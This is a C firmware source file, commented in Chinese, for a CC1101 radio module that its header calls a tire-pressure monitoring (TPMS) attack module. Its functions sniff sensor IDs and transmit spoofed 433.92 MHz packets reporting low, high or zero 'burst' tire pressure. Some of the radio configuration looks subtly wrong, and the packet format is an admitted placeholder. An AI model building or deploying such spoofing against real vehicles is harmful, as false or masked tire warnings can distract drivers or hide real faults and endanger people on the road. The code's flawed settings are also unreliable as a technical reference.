/**
  ******************************************************************************
  * @file    tpms_cc1101.c
  * @brief   Tire Pressure Monitoring System (TPMS) attack module implementation
  *          Simulates 433MHz tire pressure signals using the TI CC1101 chip
  ******************************************************************************
  */

#include "tpms_cc1101.h"
#include <string.h>

/* 私有变量 */
static SPI_HandleTypeDef *hspi_cc1101 = NULL;
static GPIO_TypeDef *cc1101_cs_port = NULL;
static uint16_t cc1101_cs_pin = 0;
static GPIO_TypeDef *cc1101_gdo0_port = NULL;
static uint16_t cc1101_gdo0_pin = 0;
static TPMS_Sensor_t tpms_sensors[TPMS_MAX_SENSORS];
static uint8_t cc1101_initialized = 0;
static uint8_t sniff_mode = 0;

/* 私有函数 */
static void cc1101_cs_low(void);
static void cc1101_cs_high(void);
static uint8_t cc1101_read_reg(uint8_t addr);
static void cc1101_write_reg(uint8_t addr, uint8_t value);
static void cc1101_send_cmd(uint8_t cmd);
static void cc1101_config_433mhz(void);
static void cc1101_reset(void);
static void tpms_encode_packet(uint8_t position, uint8_t *packet, uint8_t *len);

/**
  * @brief  CS片选拉低
  */
static void cc1101_cs_low(void)
{
    if(cc1101_cs_port != NULL) {
        HAL_GPIO_WritePin(cc1101_cs_port, cc1101_cs_pin, GPIO_PIN_RESET);
        HAL_Delay(1);
    }
}

/**
  * @brief  CS片选拉高
  */
static void cc1101_cs_high(void)
{
    if(cc1101_cs_port != NULL) {
        HAL_GPIO_WritePin(cc1101_cs_port, cc1101_cs_pin, GPIO_PIN_SET);
        HAL_Delay(1);
    }
}

/**
  * @brief  读取CC1101寄存器
  */
static uint8_t cc1101_read_reg(uint8_t addr)
{
    uint8_t tx_data = addr | 0x80;  // 读命令：最高位为1
    uint8_t rx_data = 0;
    
    if(hspi_cc1101 != NULL) {
        cc1101_cs_low();
        HAL_SPI_TransmitReceive(hspi_cc1101, &tx_data, &rx_data, 1, CC1101_SPI_TIMEOUT);
        cc1101_cs_high();
    }
    
    return rx_data;
}

/**
  * @brief  写入CC1101寄存器
  */
static void cc1101_write_reg(uint8_t addr, uint8_t value)
{
    uint8_t tx_data[2] = {addr, value};
    
    if(hspi_cc1101 != NULL) {
        cc1101_cs_low();
        HAL_SPI_Transmit(hspi_cc1101, tx_data, 2, CC1101_SPI_TIMEOUT);
        cc1101_cs_high();
    }
}

/**
  * @brief  发送CC1101命令
  */
static void cc1101_send_cmd(uint8_t cmd)
{
    if(hspi_cc1101 != NULL) {
        cc1101_cs_low();
        HAL_SPI_Transmit(hspi_cc1101, &cmd, 1, CC1101_SPI_TIMEOUT);
        cc1101_cs_high();
    }
}

/**
  * @brief  复位CC1101
  */
static void cc1101_reset(void)
{
    cc1101_cs_high();
    HAL_Delay(1);
    cc1101_cs_low();
    HAL_Delay(1);
    cc1101_cs_high();
    HAL_Delay(10);
    
    cc1101_send_cmd(CC1101_CMD_SRES);
    HAL_Delay(10);
}

/**
  * @brief  配置CC1101为433MHz
  */
static void cc1101_config_433mhz(void)
{
    // 频率配置：433.92MHz
    // FREQ = (FREQ2 << 16) | (FREQ1 << 8) | FREQ0
    // F_carrier = (256 + FREQ) * f_osc / 2^28
    // 对于26MHz晶振，433.92MHz对应的FREQ值约为0x6C7AE1
    cc1101_write_reg(CC1101_REG_FREQ2, 0x6C);
    cc1101_write_reg(CC1101_REG_FREQ1, 0x7A);
    cc1101_write_reg(CC1101_REG_FREQ0, 0xE1);
    
    // 调制配置：2-FSK
    cc1101_write_reg(CC1101_REG_MDMCFG2, 0x02);  // 2-FSK, 不进行前向纠错
    cc1101_write_reg(CC1101_REG_MDMCFG3, 0x83);  // 波特率
    cc1101_write_reg(CC1101_REG_MDMCFG4, 0xF5);  // 波特率指数和信道滤波器带宽
    
    // 数据包配置
    cc1101_write_reg(CC1101_REG_PKTLEN, 8);      // 数据包长度：8字节
    cc1101_write_reg(CC1101_REG_PKTCTRL0, 0x00); // 固定长度数据包
    
    // 同步字配置（根据实际TPMS协议调整）
    cc1101_write_reg(CC1101_REG_SYNC1, 0xD3);
    cc1101_write_reg(CC1101_REG_SYNC0, 0x91);
    
    // 输出功率配置
    cc1101_write_reg(CC1101_REG_PATABLE, 0xC0);  // 最大功率输出
    
    // 其他配置
    cc1101_write_reg(CC1101_REG_IOCFG0, 0x06);   // GDO0配置为RX数据包检测
}

/**
  * @brief  编码TPMS数据包
  */
static void tpms_encode_packet(uint8_t position, uint8_t *packet, uint8_t *len)
{
    if(position >= TPMS_MAX_SENSORS) return;
    
    TPMS_Sensor_t *sensor = &tpms_sensors[position];
    
    // TPMS数据包格式（根据实际协议调整，这里是一个示例）
    // 字节0-3: 传感器ID
    packet[0] = (uint8_t)(sensor->sensor_id >> 24);
    packet[1] = (uint8_t)(sensor->sensor_id >> 16);
    packet[2] = (uint8_t)(sensor->sensor_id >> 8);
    packet[3] = (uint8_t)(sensor->sensor_id);
    
    // 字节4-5: 胎压（kPa，低字节在前）
    packet[4] = (uint8_t)(sensor->pressure & 0xFF);
    packet[5] = (uint8_t)(sensor->pressure >> 8);
    
    // 字节6: 温度
    packet[6] = sensor->temperature;
    
    // 字节7: 电池状态和标志位
    packet[7] = sensor->battery;
    
    *len = 8;
}

/**
  * @brief  初始化TPMS CC1101模块
  * @param  hspi: SPI句柄
  * @param  cs_port: CS片选端口
  * @param  cs_pin: CS片选引脚
  * @param  gdo0_port: GDO0端口（用于数据包检测）
  * @param  gdo0_pin: GDO0引脚
  */
void tpms_cc1101_init(SPI_HandleTypeDef *hspi, GPIO_TypeDef *cs_port, uint16_t cs_pin,
                      GPIO_TypeDef *gdo0_port, uint16_t gdo0_pin)
{
    hspi_cc1101 = hspi;
    cc1101_cs_port = cs_port;
    cc1101_cs_pin = cs_pin;
    cc1101_gdo0_port = gdo0_port;
    cc1101_gdo0_pin = gdo0_pin;
    
    // 初始化传感器结构
    for(uint8_t i = 0; i < TPMS_MAX_SENSORS; i++) {
        tpms_sensors[i].position = i;
        tpms_sensors[i].sensor_id = 0;
        tpms_sensors[i].pressure = 250;  // 默认250kPa
        tpms_sensors[i].temperature = 25;
        tpms_sensors[i].battery = 100;
        tpms_sensors[i].enabled = 0;
    }
    
    // 复位CC1101
    cc1101_reset();
    
    // 配置为433MHz
    cc1101_config_433mhz();
    
    // 进入空闲状态
    cc1101_send_cmd(CC1101_CMD_SIDLE);
    HAL_Delay(10);
    
    cc1101_initialized = 1;
}

/**
  * @brief  设置TPMS传感器ID
  * @param  position: 轮胎位置
  * @param  sensor_id: 传感器ID
  */
void tpms_set_sensor_id(uint8_t position, uint32_t sensor_id)
{
    if(position >= TPMS_MAX_SENSORS || !cc1101_initialized) return;
    
    tpms_sensors[position].sensor_id = sensor_id;
}

/**
  * @brief  欺骗胎压
  * @param  position: 轮胎位置
  * @param  pressure: 虚假胎压（kPa）
  * @param  temperature: 温度（摄氏度）
  */
void tpms_spoof_pressure(uint8_t position, uint16_t pressure, uint8_t temperature)
{
    if(position >= TPMS_MAX_SENSORS || !cc1101_initialized) return;
    
    tpms_sensors[position].pressure = pressure;
    tpms_sensors[position].temperature = temperature;
    tpms_sensors[position].enabled = 1;
    
    // 编码数据包
    uint8_t packet[8];
    uint8_t len;
    tpms_encode_packet(position, packet, &len);
    
    // 刷新TX FIFO
    cc1101_send_cmd(CC1101_CMD_SFTX);
    HAL_Delay(1);
    
    // 写入数据包到TX FIFO
    cc1101_cs_low();
    uint8_t tx_cmd = 0x7F;  // 批量写入TX FIFO
    HAL_SPI_Transmit(hspi_cc1101, &tx_cmd, 1, CC1101_SPI_TIMEOUT);
    HAL_SPI_Transmit(hspi_cc1101, packet, len, CC1101_SPI_TIMEOUT);
    cc1101_cs_high();
    
    // 启动发送
    cc1101_send_cmd(CC1101_CMD_STX);
    HAL_Delay(10);
    
    // 等待发送完成
    uint8_t state = 0;
    uint32_t timeout = HAL_GetTick() + 100;
    while((state = cc1101_read_reg(CC1101_REG_MARCSTATE) & 0x1F) != 0x01 && HAL_GetTick() < timeout) {
        HAL_Delay(1);
    }
    
    // 返回空闲状态
    cc1101_send_cmd(CC1101_CMD_SIDLE);
}

/**
  * @brief  模拟低胎压警告
  * @param  position: 轮胎位置
  */
void tpms_spoof_low_pressure(uint8_t position)
{
    tpms_spoof_pressure(position, 150, 25);  // 150kPa，低于正常值
}

/**
  * @brief  模拟高胎压警告
  * @param  position: 轮胎位置
  */
void tpms_spoof_high_pressure(uint8_t position)
{
    tpms_spoof_pressure(position, 350, 25);  // 350kPa，高于正常值
}

/**
  * @brief  模拟爆胎
  * @param  position: 轮胎位置
  */
void tpms_spoof_burst(uint8_t position)
{
    tpms_spoof_pressure(position, 0, 25);  // 0kPa，表示爆胎
}

/**
  * @brief  启动嗅探模式
  */
void tpms_sniff_start(void)
{
    if(!cc1101_initialized) return;
    
    sniff_mode = 1;
    
    // 刷新RX FIFO
    cc1101_send_cmd(CC1101_CMD_SFRX);
    HAL_Delay(1);
    
    // 进入接收模式
    cc1101_send_cmd(CC1101_CMD_SRX);
}

/**
  * @brief  获取嗅探到的数据包
  * @param  data: 数据缓冲区
  * @param  len: 数据长度（输入输出参数）
  * @retval 0=成功, 1=失败
  */
uint8_t tpms_sniff_get_packet(uint8_t *data, uint8_t *len)
{
    if(!cc1101_initialized || !sniff_mode) return 1;
    
    // 检查GDO0引脚（数据包接收完成）
    if(cc1101_gdo0_port != NULL) {
        if(HAL_GPIO_ReadPin(cc1101_gdo0_port, cc1101_gdo0_pin) == GPIO_PIN_SET) {
            // 读取RX FIFO中的数据包
            uint8_t rx_bytes = cc1101_read_reg(CC1101_REG_RXBYTES) & 0x7F;
            
            if(rx_bytes > 0 && rx_bytes <= *len) {
                // 读取数据包
                cc1101_cs_low();
                uint8_t rx_cmd = 0xFF;  // 读取RX FIFO
                HAL_SPI_TransmitReceive(hspi_cc1101, &rx_cmd, data, rx_bytes, CC1101_SPI_TIMEOUT);
                cc1101_cs_high();
                
                *len = rx_bytes;
                
                // 刷新RX FIFO
                cc1101_send_cmd(CC1101_CMD_SFRX);
                
                return 0;
            }
        }
    }
    
    return 1;
}

/**
  * @brief  处理TPMS模块（主循环中调用）
  */
void tpms_process(void)
{
    if(!cc1101_initialized) return;
    
    // 在嗅探模式下，定期检查是否有数据包
    if(sniff_mode) {
        uint8_t packet[16];
        uint8_t len = 16;
        if(tpms_sniff_get_packet(packet, &len) == 0) {
            // 解析数据包，提取传感器ID等信息
            // 这里可以根据实际协议进行解析
        }
    }
}

